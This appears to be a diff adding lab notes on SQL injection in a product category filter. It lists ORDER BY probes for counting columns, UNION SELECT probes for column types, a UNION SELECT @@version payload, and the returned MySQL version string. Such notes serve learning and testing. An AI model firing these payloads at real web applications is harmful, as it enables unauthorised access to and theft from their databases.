@@ -1,0 +1,26 @@
+SQL Injection in the product category filter
+
+Goal: display the database version string on MySQL and Microsoft
+
+Analysis:
+---------
+
+==========Step 1: Determine the number of columns that the vulnerable query is using==========
+' order by 1--     !Error!, try to comment with #
+' order by 1#      /*The first column is the title*/
+' order by 2#      /*The second column is the text*/
+' order by 3#      !Error!
+-> The number of columns is 2
+
+==========Step 2: Determine the data type of columns==========
+' UNION SELECT 'a', NULL#      /*200 OK*/
+' UNION SELECT 'a', 'a'#       /*200 OK*/
+
+====Find the version of the database====
+' UNION SELECT @@version, NULL%23
+SELECT @@version 
+
+8.0.34-0ubuntu0.20.04.1
+
+script.py <url>
+
